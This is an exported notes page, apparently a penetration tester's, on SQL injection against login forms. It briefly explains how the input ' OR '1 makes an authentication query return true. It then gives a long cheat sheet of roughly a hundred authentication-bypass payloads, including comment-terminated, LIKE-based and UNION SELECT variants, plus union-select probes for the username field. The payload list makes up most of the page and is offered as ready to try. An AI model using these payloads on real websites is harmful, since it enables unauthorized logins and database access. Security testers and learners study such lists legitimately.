<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Testing Login Forms</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># SQL Injection - Testing Login Forms</h1></strong><br />• <a href="https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/">https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/</a><br />• <a href="https://websec.ca/kb/sql_injection#MySQL_Default_Databases">https://websec.ca/kb/sql_injection#MySQL_Default_Databases</a><br /><br />A user might login with the details:<br /><code>jimmy / p4ssword</code><br /><br />The website will then send a SQL query to the SQL database for those details to check whether they&#39;re correct:<br /><code>SELECT * FROM users WHERE username = &#39;jimmy&#39; AND password=&#39;p4ssword&#39;;</code><br /><br />There are 2 potential places for SQL injection here: the username and the password.<br /><code>SELECT * FROM users WHERE username = &#39;POINT 1&#39; AND password=&#39;POINT 2&#39;;</code><br /><br />If there is no input filtereing, we can potentially break the existing SQL query and insert our own.<br /><br />For example, we submit another set of login details:<br /><code>admin / p4ssword&#39; OR &#39;1</code><br /><br />By inserting <code>&#39; OR &#39;1</code>, we&#39;ve now:<br />• escaped the original SQL query with <code>&#39;</code><br />• and extended it with our own SQL code - <code>OR &#39;1</code><br /><br />Our query now becomes: <br /><code>SELECT * FROM users WHERE username = &#39;admin&#39; AND password=&#39;p4ssword&#39; OR &#39;1&#39;;</code><br /><br />This query above will now log us in regardless of whether the password we submitted is correct or not.<br />This is because <code>1</code> always returns <code>TRUE</code>.<br /><br />The correct login credentials for the website are:<br /><code>jimmy / iloveyou</code><br /><br />In the original statement, we would only be logged in if the password was correct.<br /><code>SELECT * FROM users WHERE username = &#39;jimmy&#39; AND password=&#39;p4ssword&#39;;</code><br />This SQL query would return FALSE, because there isn&#39;t an entry in the database where the username is <code>jimmy</code> and the password is <code>p4ssword</code> (the real password is <code>iloveyou</code>).<br /><br />In our modified query, we will be logged in regardless of whether the password is correct or not.<br /><code>SELECT * FROM users WHERE username = &#39;admin&#39; AND password=&#39;p4ssword&#39; OR &#39;1&#39;;</code><br />This SQL query would return TRUE.<br />This is because of the <code>OR &#39;1&#39;</code>.<br />1 is equal to TRUE.<br />Therefore, the SQL query searches the database for an entry where the username is <code>jimmy</code> and its password is <code>p4ssword OR TRUE</code>. The password field has now evaluated to TRUE, therfore this SQL query will return TRUE and log us in.<br /><br /><strong><h2>## Testing</h2></strong><br />There are tons of ways to exploit a login form.<br />The top 7 are most likely to yield a result (in my experience).<br />The rest are mostly tested by automated tools, like <code>sqlmap</code>. I probably wouldn&#39;t bother with these manually.<br /><br />Here&#39;s an example SQL query:<br /><div class="codebox"><div class="codebox">SELECT&nbsp;*&nbsp;FROM&nbsp;users&nbsp;WHERE&nbsp;username&nbsp;=&nbsp;&#39;Pablo&#39;&nbsp;AND&nbsp;password&nbsp;=&nbsp;&#39;$pass&#39;;</div></div><br /><br />Try injecting into both the password and username field. You never know.<br /><br /><strong><h3>### Top 7</h3></strong><br /><code>&#39; OR &#39;1<br />&#39; OR 1 -- -<br />&quot; OR &quot;&quot; = &quot;<br />&quot; OR 1 = 1 -- -<br />&#39;=&#39;<br />&#39;LIKE&#39;<br />&#39;=0--+</code><br /><br /><strong><h3>### Other</h3></strong><br /><code>&#39;-&#39;<br />&#39; &#39;<br />&#39;&amp;&#39;<br />&#39;^&#39;<br />&#39;*&#39;<br />&#39; or 1=1 limit 1 -- -+<br />&#39;=&quot;or&#39;<br />&#39; or &#39;&#39;-&#39;<br />&#39; or &#39;&#39; &#39;<br />&#39; or &#39;&#39;&amp;&#39;<br />&#39; or &#39;&#39;^&#39;<br />&#39; or &#39;&#39;*&#39;<br />&#39;-||0&#39;<br />&quot;-||0&quot;<br />&quot;-&quot;<br />&quot; &quot;<br />&quot;&amp;&quot;<br />&quot;^&quot;<br />&quot;*&quot;<br />&quot; or &quot;&quot;-&quot;<br />&quot; or &quot;&quot; &quot;<br />&quot; or &quot;&quot;&amp;&quot;<br />&quot; or &quot;&quot;^&quot;<br />&quot; or &quot;&quot;*&quot;<br />or true--<br />&quot; or true--<br />&#39; or true--<br />&quot;) or true--<br />&#39;) or true--<br />&#39; or &#39;x&#39;=&#39;x<br />&#39;) or (&#39;x&#39;)=(&#39;x<br />&#39;)) or ((&#39;x&#39;))=((&#39;x<br />&quot; or &quot;x&quot;=&quot;x<br />&quot;) or (&quot;x&quot;)=(&quot;x<br />&quot;)) or ((&quot;x&quot;))=((&quot;x<br />or 2 like 2<br />or 1=1<br />or 1=1--<br />or 1=1#<br />or 1=1/*<br />admin&#39; --<br />admin&#39; -- -<br />admin&#39; #<br />admin&#39;/*<br />admin&#39; or &#39;2&#39; LIKE &#39;1<br />admin&#39; or 2 LIKE 2--<br />admin&#39; or 2 LIKE 2#<br />admin&#39;) or 2 LIKE 2#<br />admin&#39;) or 2 LIKE 2--<br />admin&#39;) or (&#39;2&#39; LIKE &#39;2<br />admin&#39;) or (&#39;2&#39; LIKE &#39;2&#39;#<br />admin&#39;) or (&#39;2&#39; LIKE &#39;2&#39;/*<br />admin&#39; or &#39;1&#39;=&#39;1<br />admin&#39; or &#39;1&#39;=&#39;1&#39;--<br />admin&#39; or &#39;1&#39;=&#39;1&#39;#<br />admin&#39; or &#39;1&#39;=&#39;1&#39;/*<br />admin&#39;or 1=1 or &#39;&#39;=&#39;<br />admin&#39; or 1=1<br />admin&#39; or 1=1--<br />admin&#39; or 1=1#<br />admin&#39; or 1=1/*<br />admin&#39;) or (&#39;1&#39;=&#39;1<br />admin&#39;) or (&#39;1&#39;=&#39;1&#39;--<br />admin&#39;) or (&#39;1&#39;=&#39;1&#39;#<br />admin&#39;) or (&#39;1&#39;=&#39;1&#39;/*<br />admin&#39;) or &#39;1&#39;=&#39;1<br />admin&#39;) or &#39;1&#39;=&#39;1&#39;--<br />admin&#39;) or &#39;1&#39;=&#39;1&#39;#<br />admin&#39;) or &#39;1&#39;=&#39;1&#39;/*<br />admin&quot; --<br />admin&quot; #<br />admin&quot;/*<br />admin&quot; or &quot;1&quot;=&quot;1<br />admin&quot; or &quot;1&quot;=&quot;1&quot;--<br />admin&quot; or &quot;1&quot;=&quot;1&quot;#<br />admin&quot; or &quot;1&quot;=&quot;1&quot;/*<br />admin&quot;or 1=1 or &quot;&quot;=&quot;<br />admin&quot; or 1=1<br />admin&quot; or 1=1--<br />admin&quot; or 1=1#<br />admin&quot; or 1=1/*<br />admin&quot;) or (&quot;1&quot;=&quot;1<br />admin&quot;) or (&quot;1&quot;=&quot;1&quot;--<br />admin&quot;) or (&quot;1&quot;=&quot;1&quot;#<br />admin&quot;) or (&quot;1&quot;=&quot;1&quot;/*<br />admin&quot;) or &quot;1&quot;=&quot;1<br />admin&quot;) or &quot;1&quot;=&quot;1&quot;--<br />admin&quot;) or &quot;1&quot;=&quot;1&quot;#<br />admin&quot;) or &quot;1&quot;=&quot;1&quot;/*<br />1234 &#39; AND 1=0 UNION ALL SELECT &#39;admin&#39;, &#39;81dc9bdb52d04dc20036dbd8313ed055<br />1234 &quot; AND 1=0 UNION ALL SELECT &quot;admin&quot;, &quot;81dc9bdb52d04dc20036dbd8313ed055</code><br /><br /><strong><h3>### Tests for the </h3></strong><strong><code><h3>Username</h3></code></strong><strong><h3> field</h3></strong><br /><code>username&#39; union select 1-- -</code><br /><code>username&#39; un/**/ion select 1,2-- -</code><br /></div>
</body>
</html>
